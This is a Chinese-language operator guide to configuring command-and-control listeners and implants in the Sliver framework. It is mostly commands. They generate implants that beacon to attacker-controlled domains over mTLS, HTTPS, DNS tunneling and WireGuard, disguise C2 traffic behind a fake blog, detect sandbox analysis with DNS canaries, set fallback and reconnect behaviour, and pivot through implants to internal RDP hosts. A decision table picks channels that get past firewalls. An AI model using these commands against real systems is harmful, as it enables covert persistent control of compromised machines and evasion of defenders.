# C2 协议配置详解

## mTLS (推荐)

双向 TLS 认证，证书自动生成并嵌入 implant，无需额外配置。

**特点**: 最快最稳定，自动证书管理，端口可自定义。

### 启动监听器

```bash
# 默认端口 8888
sliver > mtls

# 自定义端口
sliver > mtls --lport 443

# 绑定特定接口
sliver > mtls --lhost 192.168.1.100 --lport 8888
```

### 生成 Implant

```bash
sliver > generate --mtls example.com
sliver > generate --mtls example.com:443
```

### 适用场景

- 内网渗透，不经过防火墙深度检测
- 实验室/可控环境
- 需要最低延迟的交互操作

---

## HTTPS

代理感知的 HTTPS C2，支持 Let's Encrypt 自动证书和静态网站伪装。

**特点**: 高隐蔽性，自动检测系统代理，支持域前置。

### 启动监听器

```bash
# 基础 HTTPS
sliver > https

# 指定域名
sliver > https --domain example.com

# Let's Encrypt 自动证书
sliver > https --domain example.com --lets-encrypt

# 自定义证书
sliver > https --domain example.com --cert ./cert.pem --key ./key.pem

# 配合静态网站伪装
sliver > https --domain example.com --website fake-blog
```

### 静态网站伪装

```bash
# 添加网站内容
sliver > websites add --website fake-blog --web-path / --content ./index.html
sliver > websites add --website fake-blog --web-path /style.css --content ./style.css

# 绑定到 HTTPS 监听器
sliver > https --domain example.com --website fake-blog
```

非 C2 流量的 HTTP 请求会返回伪装的静态页面，降低被识别概率。

### 代理感知

Implant 自动检测并使用系统代理，尝试顺序:
1. HTTPS over 系统代理
2. HTTP over 系统代理
3. HTTPS 直连
4. HTTP 直连

支持 NTLM/Kerberos 代理认证 (需要 `--wininet` 选项)。

### 生成 Implant

```bash
# 基础
sliver > generate --http example.com

# 多域名备份
sliver > generate --http example.com,backup.com

# URL 前缀 (用于重定向器)
sliver > generate --http example.com/api/v1
```

---

## DNS

通过 DNS 查询隧道化 C2 流量，适合高度受限网络。

**特点**: 绕过大多数防火墙，速度慢 (~30 Kbps)，需要 FQDN。

### DNS 记录配置

必须正确配置 DNS 记录:

```
1. A   记录: example.com       -> 服务器 IP
2. A   记录: ns1.example.com   -> 服务器 IP
3. NS  记录: 1.example.com     -> ns1.example.com
```

### 启动监听器

```bash
# 注意: 必须使用 FQDN (末尾带点)
sliver > dns --domains 1.example.com.

# 多域名
sliver > dns --domains 1.example.com.,c2.attacker.com.
```

### 生成 Implant

```bash
# 必须使用 FQDN
sliver > generate --dns 1.example.com.
```

### DNS Canary

用于检测 implant 是否被沙箱分析:

```bash
# 生成带 canary 的 implant
sliver > generate --http example.com --canary 1.example.com.

# 查看 canary 触发记录
sliver > canaries
```

当 canary 域名被解析时，说明 implant 可能正在被分析。

### systemd-resolved 冲突处理

Ubuntu 系统的 systemd-resolved 会占用 53 端口，需要禁用:

```bash
# 停止并禁用 systemd-resolved
systemctl disable systemd-resolved.service
systemctl stop systemd-resolved

# 重新配置 DNS
rm -f /etc/resolv.conf
echo "nameserver 1.1.1.1" > /etc/resolv.conf
```

---

## WireGuard

基于 WireGuard VPN 的 C2，支持高效端口转发。

**特点**: 速度快，适合稳定隧道场景，客户端配置可导出。

### 启动监听器

```bash
# 默认 UDP 53
sliver > wg

# 自定义端口
sliver > wg --lport 51820
```

### 生成客户端配置

```bash
sliver > wg-config --save ./wg-client.conf
```

输出示例:

```ini
[Interface]
Address = 100.64.0.16/16
ListenPort = 51902
PrivateKey = xxx
MTU = 1420

[Peer]
PublicKey = xxx
AllowedIPs = 100.64.0.0/16
Endpoint = <configure yourself>
```

### 使用 wg-quick 连接

```bash
# 编辑配置，设置 Endpoint
vim wg-client.conf
# 修改 Endpoint = example.com:53

# 连接
wg-quick up ./wg-client.conf

# 断开
wg-quick down ./wg-client.conf
```

### 生成 Implant

```bash
sliver > generate --wg example.com
```

### WireGuard 端口转发

```bash
# 比普通端口转发更快更稳定
sliver (SESSION) > wg-portfwd add --remote 10.10.10.10:3389
# 通过 implant 的 WireGuard IP 访问，如: 100.64.0.17:1080 -> 10.10.10.10:3389

# WireGuard SOCKS 代理
sliver (SESSION) > wg-socks start
```

---

## 多协议备份策略

### 配置多端点

```bash
# 主 mTLS，备份 HTTP 和 DNS
sliver > generate \
  --mtls primary.com \
  --http backup.com \
  --dns 1.dns.com.
```

### 重连逻辑

```
1. 按顺序尝试每个端点
2. 失败后等待 --reconnect 秒 (默认 60)
3. 循环尝试直到 --max-errors (默认 1000)
```

```bash
# 自定义重连参数
sliver > generate \
  --mtls primary.com \
  --http backup.com \
  --reconnect 30 \
  --max-errors 100
```

### 监听器管理

```bash
# 查看所有监听器
sliver > jobs

# 停止指定监听器
sliver > jobs -k JOB_ID

# 停止所有监听器
sliver > jobs -K
```

---

## 协议选择决策表

```
网络环境评估
|
+-- 可以直连任意端口? --------> mTLS (最快)
|
+-- 仅允许 HTTP/HTTPS 出网?
|   |
|   +-- 有合法域名? ----------> HTTPS + Let's Encrypt
|   +-- 无域名 ----------------> HTTP
|
+-- 仅允许 DNS 出网? ---------> DNS (慢但可靠)
|
+-- 需要 VPN 级隧道? ---------> WireGuard
|
+-- 不确定/高可用要求? -------> 多协议备份
    (mTLS + HTTPS + DNS)
```
